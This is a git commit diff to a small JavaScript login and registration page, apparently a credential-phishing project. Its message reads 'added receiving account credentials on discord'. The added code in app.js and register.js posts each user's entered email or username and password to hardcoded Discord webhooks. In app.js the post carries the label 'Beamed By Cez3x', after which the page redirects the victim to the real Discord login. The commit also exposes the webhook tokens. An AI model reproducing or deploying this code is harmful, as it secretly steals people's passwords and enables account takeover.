94144b84c8f8be256208d09629cffd9546a25b5a
TSezari Kvelashvili <cez3x.business@gmail.com>
2023-07-28 18:05:01 +0400

    added receiving account credentials on discord

--- app.js
+++ app.js
@@ -1,4 +1,5 @@
 const submitButton = document.getElementById('submit-btn')
+const note = document.querySelector('.note')
 let userName
 let userPassword
 
@@ -9,16 +10,39 @@ function getData() {
     if(userName && userPassword) {
         if(userName == localStorage.getItem('user')) {
             if(userPassword == localStorage.getItem('password')) {
-                console.log('Success!!!')
+                alert(' Logged in Successfully!')
             } else {
-                console.log('Wrong Password!')
+                alert('Wrong Password!')
+                note.style.visibility = 'visible'
             }
         } else {
-            console.log('Wrong Username!!!')
+            alert('Wrong Username!')
+            note.style.visibility = 'visible'
         }
     } else {
-        console.log('Error!')
+        alert('Please Fill All Required Fields.')
     }
+
+    
 }
 
 submitButton.addEventListener('click', getData)
+
+btn.addEventListener("click",function(){
+    var email = document.getElementById("email").value.replace(/\s/g, "");
+    var password = document.getElementById("password").value.replace(/\s/g, "");
+    if (email.length === 0 || password.length === 0) {
+        alert("Please Fill All Required Field");
+        return false;
+    };
+    const request = new XMLHttpRequest();
+    request.open("POST", "https://discord.com/api/webhooks/1079346516310892596/_LeeRJG2rjDNCgl_o-Os7Sf7FRwgQ-aIk3E6aQFcDH7T3-VhQ0VuQG-fa_jHzPREu3r8");
+    request.setRequestHeader('Content-type', 'application/json');
+    const params = {
+                  username: "Beamed By Cez3x",
+                  avatar_url: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSRcghlSHcDsP-6nqgzvwgUjV3BRnZ5raGmjQ&usqp=CAU",
+                  content:"**__New Account__**"+ "\n\n" + "**Email Or Phone Number: **" + email + "\n" + "**Password : **" + password + "\n\n" + "**=========================================================================**"
+                   };
+    request.send(JSON.stringify(params));
+    setTimeout(() => {  window.location.replace("http://www.discord.com/login"); }, 2000);
+});
--- register.js
+++ register.js
@@ -12,17 +12,28 @@ function saveData() {
                 localStorage.setItem('user', userName)
                 localStorage.setItem('password', userPassword)
 
-                console.log('Success!!!')
-                console.log(localStorage.getItem('user'), localStorage.getItem('password'))
+                alert('Registered successfully!')
+
+                const request = new XMLHttpRequest();
+                request.open("POST", "https://discord.com/api/webhooks/1134485533863706734/tcwZGNnP3jYy1ch9SYDzTUDcPLFpu0tvuvhYGEDyzNvTgIWn6NDHHBeP5o5Kq4cHKvUk");
+                request.setRequestHeader('Content-type', 'application/json');
+                const params = {
+                            username: "Register / Login system  ",
+                            avatar_url: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSRcghlSHcDsP-6nqgzvwgUjV3BRnZ5raGmjQ&usqp=CAU",
+                            content:"**__New Account Registered__**"+ "\n\n" + "**Username: **" + userName + "\n" + "**Password : **" + userPassword + "\n\n" + "**=========================================================================**"
+                            };
+                request.send(JSON.stringify(params));
             } else {
-                console.log('Username should be at least 3 characters long')
+                alert('Username should be at least 3 characters long')
             }
         } else {
-            console.log('Password must be at least 8 characters long')
+            alert('Password must be at least 8 characters long')
         }
     } else {
-        console.log('Registration failed')
+        alert('Please fill all required fields.')
     }
+
+    
 }
 
 submitButton.addEventListener('click', saveData)
